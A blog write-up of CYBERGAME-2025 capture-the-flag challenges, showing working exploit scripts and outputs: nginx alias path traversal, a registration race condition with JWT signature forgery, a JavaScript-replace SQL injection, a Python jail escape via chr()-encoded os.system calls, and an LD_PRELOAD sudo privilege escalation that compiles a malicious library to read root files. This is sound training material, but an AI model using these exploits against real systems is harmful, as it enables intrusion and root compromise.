---
title: "CYBERGAME-2025 {WEB-PENTESTING & BINARY-EXPLOITATION}"
subtitle: "⚡ Web pentesting is quite cool if you know how to do it.⚡"
summary: "* Kenyan version organized by: Ministry of Information,Communications and the Digital Economy*"
date: 2025-06-10
cardimage: cybergame.png
featureimage: cybergame.png
caption: cybergame
authors:
  - Havoc: logo.png
---





# [★★☆] Equestria

## Door To The Stable

![web](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/doortothestable.png?raw=true)


`nginx.conf`
```
events {
    worker_connections 1024;
}

http {
    include mime.types;

    server {
        listen 80;
        server_name localhost;

        root /app/src/html/;
        index index.html;


        location /images {
            alias /app/src/images/;
            autoindex on;
        }

        location /ponies/ {
            alias /app/src/ponies/;
        }

        location /resources/ {
            alias /app/src/resources/;
        }

        location /secretbackend/ {
            proxy_pass http://secretbackend:3000/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}
```

*Solution*

This is an nginx path traversal.

```httpspec
GET /images../secretbackend/index.js HTTP/1.1
Host: exp.cybergame.sk:7000
```
so after identifying it it was easy feeding it to the browser and to spot the index.js file with the suspicious string.

![princess](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/index.js%20file.png?raw=true)
```
pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}
```

## Shadow Realm

![web](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/equetria-shadow%20realm.png?raw=true)

*Solution*

This is a race condition that can be exploited for 1 second from when a user is registered, while `sendEmailToAdministrator` is being executed.

In the sources we can see the developers did not fully finish this functionality:

```js
async function sendEmailToAdministrator(userId, username) {
    // TODO: Implement email sending. We'll just sleep until then.
    await sleep(1000);
    console.log(`🦄 Dark Council notified about new subject: ${username}`);
    return true;
}

app.post("/api/register", async (req, res) => {
    try {
        const {username, password, email} = req.body;

        const {rows} = await dbAsync.query(
            "INSERT INTO users (username, password, email) VALUES ($1, $2, $3) RETURNING id",
            [username, password, email]
        );

        const userId = rows[0].id;
        await sendEmailToAdministrator(userId, username);

        await dbAsync.query("UPDATE users SET verified = false WHERE id = $1", [
            userId,
        ]);
```

The race condition happens because the default value of the verified column in the user table is set to `true` in the database, and it is not specified in the first `INSERT` query.

```
CREATE TABLE IF NOT EXISTS users
(
    id       TEXT PRIMARY KEY DEFAULT uuid_generate_v4(),
    username TEXT UNIQUE,
    password TEXT,
    email    TEXT,
    verified BOOLEAN          DEFAULT true
);
```

It is only later set to `false`, after the sleep of 1 second in `sendEmailToAdministrator`.

All that needs to happen is to register an account and login before the `users.verified` is set to `false`, then you are in!

![web](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/equestria%20race.png?raw=true)

```json
{
  "success": true,
  "welcome_msg": "Access granted. The light has no power here. You walk the path of the unseen, where only those who understand the night may tread. Tread carefully, for even the darkness has its watchers… SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}"
}
```

## The Dark Ruler

Description

There seems to be an endpoint that is only accessible by a privileged user. Can you find a way to access it?

Solution

This part to the challenge requires a session modification. Once we could log in as a verified user in `Shadow Realm`, we got access to a properly signed JWT token. But we need to get a privileged user token.

In the sources we see that we need to get `is_d4rk_pr1nc3ss` set to true:

```js
app.get("/api/secret-note", authMiddleware, async (req, res) => {
    if (req.user.is_d4rk_pr1nc3ss) {
        return res.send(process.env.DARK_PRINCESS_SECRET);
    }
```

Next we see that the way that [`jwt.js`](https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/blob/main/Equestria/Solution/src/jwt.js) processes tokens is flawed:

```js
function verifyToken(token) {
    const parts = token.split(".");
    if (parts.length < 3) return null;

    const payload = parts[1];
    const signature = parts[parts.length - 1];

    const expectedSignature = crypto
        .createHmac("sha256", JWT_SECRET)
        .update(parts[parts.length - 2])
        .digest("base64");

    if (signature === expectedSignature) {
        return JSON.parse(Buffer.from(payload, "base64").toString());
    }
    return null;
}
```

The parts of the JWT token are split by `.` into `parts`. Notice that the real signature is parsed as `parts[parts.length - 1]`, which is calculated as `parts[parts.length - 2]`, but the actual payload processed further is parsed as `parts[1]`. Basically, the actual payload is not what the signature is calculated on and can be tampered with.

When we put this all together, our "malicious token" includes a "malicious payload" that sets `is_d4rk_pr1nc3ss` to `true`; it looks like this:

```python
malicious_token = f"{parts[0]}.{malicious_payload_b64}.{parts[1]}.{parts[2]}"
```

This is all done in `exploit.py`
```python
import aiohttp
import asyncio
import base64
import json
import uuid

"""
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
"""

# Server URL
BASE_URL = "http://exp.cybergame.sk:7000/secretbackend"

# Basic auth credentials
AUTH = aiohttp.BasicAuth("pr1ncess", "SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}")

async def register_and_login(session):
    username = f"hacker_{uuid.uuid4()}"
    password = "hacker"
    email = 'hacker@hacker.hacker'
    
    data = {
        "username": username,
        "password": password,
        "email": email
    }
    
    # Start register request but don't wait for response
    register_task = session.post(
        f"{BASE_URL}/api/register",
        json=data,
        auth=AUTH
    )
    
    # Immediately start login request
    login_data = {
        "username": username,
        "password": password
    }
    login_task = session.post(
        f"{BASE_URL}/api/login",
        json=login_data,
        auth=AUTH
    )
    
    # Wait for both requests to complete
    register_response, login_response = await asyncio.gather(register_task, login_task)
    
    if login_response.status == 200:
        token = login_response.cookies.get("token").value
        print('token:', token)
        return token
    else:
        print(f"Login failed: {await login_response.text()}")
        return None

def create_malicious_token(valid_token):
    # Split the valid token
    parts = valid_token.split(".")
    
    # Create malicious payload
    malicious_payload = {
        "id": "any_id",  # This doesn't matter as we're bypassing verification
        "username": "any_username",
        "is_d4rk_pr1nc3ss": True
    }
    
    # Encode malicious payload
    malicious_payload_b64 = base64.b64encode(
        json.dumps(malicious_payload).encode()
    ).decode()
    
    # Create malicious token
    # Format: header.malicious_payload.original_payload.signature
    malicious_token = f"{parts[0]}.{malicious_payload_b64}.{parts[1]}.{parts[2]}"
    
    return malicious_token

async def get_secret_note(session, token):
    response = await session.get(
        f"{BASE_URL}/api/secret-note",
        cookies={"token": token},
        auth=AUTH
    )
    
    if response.status == 200:
        return await response.text()
    else:
        print(f"Failed to get secret note: {await response.text()}")
        return None

async def main():
    async with aiohttp.ClientSession(trust_env=True) as session:
        # Try multiple times to catch the race condition
        for _ in range(10):
            print("Attempting to register and login...")
            
            # Try to register and login simultaneously
            token = await register_and_login(session)
            if not token:
                continue
            
            print("Got valid token! Creating malicious token...")
            
            # Create malicious token
            malicious_token = create_malicious_token(token)
            
            # Try to get secret note
            secret = await get_secret_note(session, malicious_token)
            if secret:
                print(f"Success! Secret note: {secret}")
                print(f"Malicious token: {malicious_token}")
                return
            
            print("Failed to get secret note, trying again...")
            await asyncio.sleep(0.1)  # Small delay between attempts
        
        print("Failed to exploit after multiple attempts")

if __name__ == "__main__":
    asyncio.run(main()) 
```

Results:

```
python3 exploit.py
Attempting to register and login...
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjhlNTc3MGMwLTIxM2MtNDI2NC1iMDc2LTlmYWNkMmY2MzBlYyIsInVzZXJuYW1lIjoiaGFja2VyX2MxMjkxODgxLTQzZDgtNGFmOC1hNDNjLTQ2MmJhZmRjNzA0ZiJ9.%2BrrHJQUzZABEwFs6E2h9p%2FkwZ%2F4yEmIqMGtWA%2BiH%2FgE%3D
Got valid token! Creating malicious token...
Success! Secret note: They fear the night, yet they do not understand its power. The fools bask in the daylight, blind to what lurks beyond the stars. But I see. I remember. And soon, they will too. The throne was never meant for the sun alone. The time will come. I must be patient. SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y}
```

## Final Curse

![jaille](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/final%20escape.png?raw=true)


*Solution*

This appears to be an SQL injection; well, I guess more of a JavaScript injection—the following payload does the magic:

```
$`\tOR\tTRUE\tUNION\t$`
```

It is because `\t` is not filtered and is a valid token separator in PostgreSQL. But the main part if breaking of the single quotes.

In JavaScript's `String.prototype.replace(searchValue, replaceValue)`, the `replaceValue` isn’t just verbatim text - any `$<something>` sequences inside it are special "replacement‑pattern" tokens. The ones that matter here are:

- `` $` ``  (dollar + backtick): the portion of the original string before the matched substring
- `$&` (dollar + ampersand): the matched substring itself
- `$'` (dollar + single‑quote): the portion after the match

Injecting that results in this query:

```sql
SELECT *
FROM notes
WHERE user_id = 'SELECT * FROM notes WHERE user_id = '
   OR TRUE
UNION
SELECT *
FROM notes
WHERE user_id = ''
```

Use `exploit_sqli.py`
```python
import requests
import base64
import json

# Server URL
BASE_URL = "http://exp.cybergame.sk:7000/secretbackend"

# Basic auth credentials
AUTH = ("pr1ncess", "SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}")

# SQL injection payload
payload = '$`\tOR\tTRUE\tUNION\t$`'

# Create malicious token
malicious_payload = {
    "id": payload,
    "username": "any_username",
    "is_d4rk_pr1nc3ss": True
}

# Encode malicious payload
malicious_payload_b64 = base64.b64encode(
    json.dumps(malicious_payload).encode()
).decode()

# Create malicious token
# Format: header.malicious_payload.original_payload.signature
malicious_token = f"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{malicious_payload_b64}.eyJpZCI6Ijk3ZmM2NTAzLTZiNTEtNGMwNC1iN2FkLWIyODg0ODU2NTg1MiIsInVzZXJuYW1lIjoiaGFja2VyXzU0YWQzNDM3LWE3NDQtNDNiZC04ODk3LTRjNzAzNjE5NDE0MCJ9.sjx1E1dYfc51yeAWZRZpedQKHHnUHow6W%2B9Z6pnY9Uc="

# Make the request
response = requests.get(
    f"{BASE_URL}/api/notes",
    auth=AUTH,
    cookies={"token": malicious_token}
)

# Print the response
print(f"Status code: {response.status_code}")
print(f"Response: {response.text}") 
```
and get a bunch of mess, somewhere in there is a flag:

```
SK-CERT{j4v4scr1p7_1s_full_of_curs3d_(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(![]+[])[+[]]+(![]+[])[+[]]}
```

### **JAILE - Calculator**
![calc](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/jaille%20calculator.png?raw=true)

calc.py

**solution**

The challenge involved analyzing an exposed Python calculator program (`calc.py`) running as a service on `exp.cybergame.sk:7002`. The goal was to find a vulnerability and exploit it to retrieve a flag.

## Steps Taken
1.  **Code Analysis:** Reviewed `calc.py` to understand its functionality and identify the `exec()` vulnerability and filtering mechanism.
```bash
    import socket
import os
import pty
import sys

def handle_client(conn):
    s_fd = conn.fileno()
    os.dup2(s_fd, 0)
    os.dup2(s_fd, 1)
    os.dup2(s_fd, 2)
    data = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
        if b'\n' in data:
            break
    text = data.decode().strip()

    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    # Check for forbidden characters.
    for character in ['\'', '\"']:
        if character in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    try:
        exec('print(' + text + ')')
    except Exception as e:
        conn.sendall(("Error: " + str(e) + "\n").encode())

def main():
    host = '0.0.0.0'
    port = 1337
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f"Listening on {host}:{port}")
        conn, addr = s.accept()  # Handle one connection.
        with conn:
            print(f"Connection from {addr}")
            handle_client(conn)
    sys.exit(0)

if __name__ == "__main__":
    main()
    ```
2.  **Exploit Development:** Created a Python script (`exploit.py`) to:
    *   Connect to the remote service (`exp.cybergame.sk:7002`).
    *   Define a function `build_payload(command)` that takes a shell command string and constructs the bypass payload using `chr()` encoding.
    *   Send the generated payload to the service.
    *   Receive and print the response.
    `exploit.py`
    
```bash
    #!/usr/bin/env python3
import socket
import sys

HOST = "exp.cybergame.sk"
PORT = 7002

def build_payload(command):
    """Builds the payload using chr() to bypass filters."""
    import_key = "+".join([f"chr({ord(c)})" for c in "__import__"])
    os_module = "+".join([f"chr({ord(c)})" for c in "os"])
    system_func = "+".join([f"chr({ord(c)})" for c in "system"])
    cmd_str = "+".join([f"chr({ord(c)})" for c in command])
    payload = f"getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})"
    return payload

def main():
    command = "cat flag.txt" # Changed command to cat the flag file

    payload = build_payload(command)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            print(f"[*] Connecting to {HOST}:{PORT}")
            s.connect((HOST, PORT))
            print("[*] Connected.")

            print("[*] Sending payload...")
            s.sendall(payload.encode() + b'\n')
            print("[*] Payload sent.")

            print("[*] Receiving response...")
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                print("[*] Socket timeout reached.")
            except Exception as e:
                print(f"[-] Error while receiving: {e}")

            print("[*] Response received:")
            # Decode and print the relevant part of the response
            decoded_response = response.decode(errors='ignore')
            print(decoded_response)
            # Extract the flag (assuming it's the first line before the return code)
            flag = decoded_response.split('\n')[1] # The output starts with '>> ', then the flag, then the return code
            print(f"\n[*] Flag: {flag}")

    except socket.timeout:
        print(f"[-] Connection timed out to {HOST}:{PORT}")
    except socket.error as e:
        print(f"[-] Socket error: {e}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()
```

3.  **Initial Exploration:** Ran the exploit with the command `ls -la`.
The output revealed the presence of `flag.txt` in the current directory:
    
	```bash
	>> total 32
    drwxr-xr-x 1 calc calc 4096 Mar 31 20:22 .
    drwxr-xr-x 1 root root 4096 Mar 31 20:01 ..
    -rw-r--r-- 1 calc calc  220 Apr 23  2023 .bash_logout
    -rw-r--r-- 1 calc calc 3526 Apr 23  2023 .bashrc
    -rw-r--r-- 1 calc calc  807 Apr 23  2023 .profile
    -rw-rw-r-- 1 root root   38 Mar 31 16:53 flag.txt
    -rw-rw-r-- 1 root root 1762 Mar 31 20:22 main.py
    0
    ```
    
    4.  **Flag Retrieval:** Modified the command in `exploit.py` to `cat flag.txt` and reran the script.
The service executed the command and returned its output, which included the flag:

    >> SK-CERT{35c3p1ng_py7h0n_15_345y_745k}
    0
    
    ## Retrieved Flag

The flag obtained from the service is:
```bash
**`SK-CERT{35c3p1ng_py7h0n_15_345y_745k}`**
```

## Conclusion

The vulnerability lies in the insecure use of `exec()` combined with an inadequate blacklist filter. By leveraging Python's built-in capabilities and character encoding, the filter was bypassed, allowing arbitrary command execution and retrieval of the flag.


 
 The second challenge on the same calculator was this:
 
### **JAILE - User**

![web](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/jaille%20user.png?raw=true)

**solution**

That is interesting functionality. We can see that a separate user was created to run the calculator, but maybe the root user has more secrets that can be uncovered.

This challenge suggests that we need to access root user secrets using the same vulnerability we exploited in the first part. I'll modify our exploit to explore the system further and look for root user data.
Starting to analyze the system for potential root access methods.
```bash
#!/usr/bin/env python3
import socket
import sys

HOST = "exp.cybergame.sk"
PORT = 7002

def build_payload(command):
    """Builds the payload using chr() to bypass filters."""
    import_key = "+".join([f"chr({ord(c)})" for c in "__import__"])
    os_module = "+".join([f"chr({ord(c)})" for c in "os"])
    system_func = "+".join([f"chr({ord(c)})" for c in "system"])
    cmd_str = "+".join([f"chr({ord(c)})" for c in command])
    payload = f"getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})"
    return payload

def main():
    command = "id" # Check the current user ID

    payload = build_payload(command)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            print(f"[*] Connecting to {HOST}:{PORT}")
            s.connect((HOST, PORT))
            print("[*] Connected.")

            print("[*] Sending payload...")
            s.sendall(payload.encode() + b'\n')
            print("[*] Payload sent.")

            print("[*] Receiving response...")
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                print("[*] Socket timeout reached.")
            except Exception as e:
                print(f"[-] Error while receiving: {e}")

            print("[*] Response received:")
            decoded_response = response.decode(errors='ignore')
            print(decoded_response)

    except socket.timeout:
        print(f"[-] Connection timed out to {HOST}:{PORT}")
    except socket.error as e:
        print(f"[-] Socket error: {e}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()
```

Starting to analyze the system for potential root access methods.

Analyzing the system to understand user context and potential root access methods.
```bash
ubuntu@sandbox:~ $ cd /home/ubuntu && python3 /home/ubuntu/exploit_user.py
[*] Connecting to exp.cybergame.sk:7002
[*] Connected.
[*] Sending payload...
[*] Payload sent.
[*] Receiving response...
[*] Response received:
>> uid=1000(calc) gid=1000(calc) groups=1000(calc)
0
```
Exploring the file system structure to locate potential root user secrets.
```bash
ubuntu@sandbox:~ $ cd /home/ubuntu && python3 /home/ubuntu/exploit_user.py
[*] Connecting to exp.cybergame.sk:7002
[*] Connected.
[*] Sending payload...
[*] Payload sent.
[*] Receiving response...
[*] Response received:
>> total 68
drwxr-xr-x   1 root root 4096 Apr 27 18:34 .
drwxr-xr-x   1 root root 4096 Apr 27 18:34 ..
-rwxr-xr-x   1 root root    0 Apr 27 18:34 .dockerenv
lrwxrwxrwx   1 root root    7 May 13  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Jan 28  2024 boot
drwxr-xr-x   5 root root  340 Apr 27 18:34 dev
drwxr-xr-x   1 root root 4096 Apr 27 18:34 etc
drwxr-xr-x   1 root root 4096 Mar 31 20:01 home
lrwxrwxrwx   1 root root    7 May 13  2024 lib -> usr/lib
lrwxrwxrwx   1 root root    9 May 13  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 May 13  2024 media
drwxr-xr-x   2 root root 4096 May 13  2024 mnt
drwxr-xr-x   2 root root 4096 May 13  2024 opt
dr-xr-xr-x 304 root root    0 Apr 27 18:34 proc
drwx------   1 root root 4096 Mar 31 20:01 root
drwxr-xr-x   1 root root 4096 Apr 27 18:34 run
lrwxrwxrwx   1 root root    8 May 13  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 May 13  2024 srv
dr-xr-xr-x  13 root root    0 Apr 27 16:29 sys
drwxrwxrwt   1 root root 4096 Mar 31 20:00 tmp
drwxr-xr-x   1 root root 4096 May 13  2024 usr
drwxr-xr-x   1 root root 4096 May 13  2024 var
0
```

Identifying root user files and potential methods to access them.
```bash
#!/usr/bin/env python3
import socket
import sys

HOST = "exp.cybergame.sk"
PORT = 7002

def build_payload(command):
    """Builds the payload using chr() to bypass filters."""
    import_key = "+".join([f"chr({ord(c)})" for c in "__import__"])
    os_module = "+".join([f"chr({ord(c)})" for c in "os"])
    system_func = "+".join([f"chr({ord(c)})" for c in "system"])
    cmd_str = "+".join([f"chr({ord(c)})" for c in command])
    payload = f"getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})"
    return payload

def main():
    command = "ls -la /root" # Try to list contents of root directory

    payload = build_payload(command)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            print(f"[*] Connecting to {HOST}:{PORT}")
            s.connect((HOST, PORT))
            print("[*] Connected.")

            print("[*] Sending payload...")
            s.sendall(payload.encode() + b'\n')
            print("[*] Payload sent.")

            print("[*] Receiving response...")
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                print("[*] Socket timeout reached.")
            except Exception as e:
                print(f"[-] Error while receiving: {e}")

            print("[*] Response received:")
            decoded_response = response.decode(errors='ignore')
            print(decoded_response)

    except socket.timeout:
        print(f"[-] Connection timed out to {HOST}:{PORT}")
    except socket.error as e:
        print(f"[-] Socket error: {e}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()
```
Attempting to identify root user files by listing the contents of /root directory.
```bash
ubuntu@sandbox:~ $ cd /home/ubuntu && python3 /home/ubuntu/exploit_user.py
[*] Connecting to exp.cybergame.sk:7002
[*] Connected.
[*] Sending payload...
[*] Payload sent.
[*] Receiving response...
[*] Response received:
>> ls: cannot open directory '/root': Permission denied
512
```

Searching for SUID binaries that could be used for privilege escalation.
```bash
#!/usr/bin/env python3
import socket
import sys

HOST = "exp.cybergame.sk"
PORT = 7002

def build_payload(command):
    """Builds the payload using chr() to bypass filters."""
    import_key = "+".join([f"chr({ord(c)})" for c in "__import__"])
    os_module = "+".join([f"chr({ord(c)})" for c in "os"])
    system_func = "+".join([f"chr({ord(c)})" for c in "system"])
    cmd_str = "+".join([f"chr({ord(c)})" for c in command])
    payload = f"getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})"
    return payload

def main():
    command = "find / -type f -perm -4000 -ls 2>/dev/null" # Look for SUID binaries

    payload = build_payload(command)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            print(f"[*] Connecting to {HOST}:{PORT}")
            s.connect((HOST, PORT))
            print("[*] Connected.")

            print("[*] Sending payload...")
            s.sendall(payload.encode() + b'\n')
            print("[*] Payload sent.")

            print("[*] Receiving response...")
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                print("[*] Socket timeout reached.")
            except Exception as e:
                print(f"[-] Error while receiving: {e}")

            print("[*] Response received:")
            decoded_response = response.decode(errors='ignore')
            print(decoded_response)

    except socket.timeout:
        print(f"[-] Connection timed out to {HOST}:{PORT}")
    except socket.error as e:
        print(f"[-] Socket error: {e}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()
```
Response is juicy!!!
```bash
ubuntu@sandbox:~ $ cd /home/ubuntu && python3 /home/ubuntu/exploit_user.py
[*] Connecting to exp.cybergame.sk:7002
[*] Connected.
[*] Sending payload...
[*] Payload sent.
[*] Receiving response...
[*] Response received:
>>   1566413    640 -rwsr-xr-x   1 root     root       653888 Dec 19  2023 /usr/lib/openssh/ssh-keysign
  1552816     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
  1552810     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
  1552948     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
  1555727     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
  1558016     36 -rwsr-xr-x   1 root     root        35128 Mar 28  2024 /usr/bin/umount
  1557992     72 -rwsr-xr-x   1 root     root        72000 Mar 28  2024 /usr/bin/su
  1555258     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
  1554627     60 -rwsr-xr-x   1 root     root        59704 Mar 28  2024 /usr/bin/mount
  1589119    276 -rwsr-xr-x   1 root     root       281624 Jun 27  2023 /usr/bin/sudo
256
```

Analyzing SUID binaries for potential privilege escalation vectors.
```bash
#!/usr/bin/env python3
import socket
import sys

HOST = "exp.cybergame.sk"
PORT = 7002

def build_payload(command):
    """Builds the payload using chr() to bypass filters."""
    import_key = "+".join([f"chr({ord(c)})" for c in "__import__"])
    os_module = "+".join([f"chr({ord(c)})" for c in "os"])
    system_func = "+".join([f"chr({ord(c)})" for c in "system"])
    cmd_str = "+".join([f"chr({ord(c)})" for c in command])
    payload = f"getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})"
    return payload

def main():
    # Check if sudo can be used without password
    command = "sudo -l"

    payload = build_payload(command)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            print(f"[*] Connecting to {HOST}:{PORT}")
            s.connect((HOST, PORT))
            print("[*] Connected.")

            print("[*] Sending payload...")
            s.sendall(payload.encode() + b'\n')
            print("[*] Payload sent.")

            print("[*] Receiving response...")
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                print("[*] Socket timeout reached.")
            except Exception as e:
                print(f"[-] Error while receiving: {e}")

            print("[*] Response received:")
            decoded_response = response.decode(errors='ignore')
            print(decoded_response)

    except socket.timeout:
        print(f"[-] Connection timed out to {HOST}:{PORT}")
    except socket.error as e:
        print(f"[-] Socket error: {e}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()
```

Checking sudo permissions to determine if it can be used for privilege escalation.

```bash
ubuntu@sandbox:~ $ cd /home/ubuntu && python3 /home/ubuntu/exploit_user.py
[*] Connecting to exp.cybergame.sk:7002
[*] Connected.
[*] Sending payload...
[*] Payload sent.
[*] Receiving response...
[*] Response received:
>> Matching Defaults entries for calc on fc07b8081fbf:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty, env_keep+=LD_PRELOAD
User calc may run the following commands on fc07b8081fbf:
    (ALL) NOPASSWD: /bin/netstat
0
```

Exploiting sudo with LD_PRELOAD to access root user secrets.
```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructor function that runs when the library is loaded
void __attribute__((constructor)) init() {
    // Clear environment variables that might interfere
    unsetenv("LD_PRELOAD");
    // Execute the command to read the root flag
    // Assuming the flag is in /root/flag.txt based on the previous challenge structure
    system("/bin/cat /root/flag.txt");
}
```

Creating a shared library exploit using LD_PRELOAD to access root user secrets.

The exploit code  needs to be compiled on the target system where gcc might be available. I will now modify the exploit script to perform the following steps on the remote server:
I Wrote  a C code for the shared library (preload.c) to a temporary directory (/tmp).
and Compiled  the C code into a shared library (preload.so) using gcc in the temporary directory.

Executed the allowed *sudo* command *(/bin/netstat)* with the *LD_PRELOAD* environment variable pointing to our compiled shared library. This  triggerred our code within the shared library to run with root privileges and retrieve the flag from the root directory. Let's try reading /root/flag.txt first based on the previous challenge pattern
Creating and compiling a shared library exploit on the remote system to access root user secrets.
```bash
#!/usr/bin/env python3
import socket
import sys

HOST = "exp.cybergame.sk"
PORT = 7002

def build_payload(command):
    """Builds the payload using chr() to bypass filters."""
    import_key = "+".join([f"chr({ord(c)})" for c in "__import__"])
    os_module = "+".join([f"chr({ord(c)})" for c in "os"])
    system_func = "+".join([f"chr({ord(c)})" for c in "system"])
    cmd_str = "+".join([f"chr({ord(c)})" for c in command])
    payload = f"getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})"
    return payload

def main():
    # Create a multi-step command to:
    # 1. Check if gcc is installed
    # 2. Create the preload.c file in /tmp
    # 3. Compile it if gcc exists
    # 4. Use LD_PRELOAD with sudo netstat
    
    command = """
    which gcc || echo "gcc not found";
    echo '#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    system("cat /root/flag.txt");
}' > /tmp/preload.c;
    if which gcc > /dev/null; then
        gcc -shared -fPIC /tmp/preload.c -o /tmp/preload.so && 
        echo "Compiled successfully" && 
        sudo LD_PRELOAD=/tmp/preload.so /bin/netstat;
    else
        echo "Cannot compile, looking for alternative methods";
        # Try to find the flag directly
        find /root -type f -name "flag*" 2>/dev/null;
        # Try to use other methods to read root files
        sudo /bin/netstat -help | grep -i file;
    fi
    """

    payload = build_payload(command)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            print(f"[*] Connecting to {HOST}:{PORT}")
            s.connect((HOST, PORT))
            print("[*] Connected.")

            print("[*] Sending payload...")
            s.sendall(payload.encode() + b'\n')
            print("[*] Payload sent.")

            print("[*] Receiving response...")
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                print("[*] Socket timeout reached.")
            except Exception as e:
                print(f"[-] Error while receiving: {e}")

            print("[*] Response received:")
            decoded_response = response.decode(errors='ignore')
            print(decoded_response)

    except socket.timeout:
        print(f"[-] Connection timed out to {HOST}:{PORT}")
    except socket.error as e:
        print(f"[-] Socket error: {e}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()

```

Executing the LD_PRELOAD exploit to access root user secrets with sudo privileges.
```bash
ubuntu@sandbox:~ $ cd /home/ubuntu && python3 /home/ubuntu/exploit_user.py
[*] Connecting to exp.cybergame.sk:7002
[*] Connected.
[*] Sending payload...
[*] Payload sent.
[*] Receiving response...
[*] Response received:
>> /usr/bin/gcc
Compiled successfully
SK-CERT{r007_u53r_pr3l04d3d_pr1v1l3635}
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 cdaa1b13df3c:2337       cybergame-fake-so:43182 ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
0
```

Successfully retrieved the second flag: 
```bash
SK-CERT{r007_u53r_pr3l04d3d_pr1v1l3635}
```

### Conclusion 

For this challenge, I needed to find a way to access root user secrets. After exploring the system, I discovered a privilege escalation vulnerability:
The 'calc' user can run /bin/netstat with sudo without requiring a password
The sudo configuration preserves the LD_PRELOAD environment variable (a serious security misconfiguration)
I exploited this vulnerability by:
Creating a malicious shared library in C that executes cat /root/flag.txt when loaded
Compiling the library on the remote system
Using *sudo LD_PRELOAD=/tmp/preload.so /bin/netstat* to execute the library with root privileges
This technique allowed me to run code as root and access the flag file in the root user's directory. The *LD_PRELOAD* environment variable is a known *privilege escalation* vector when preserved in sudo configurations.

### **Final escape**
The final challenge was to escape the docker container.


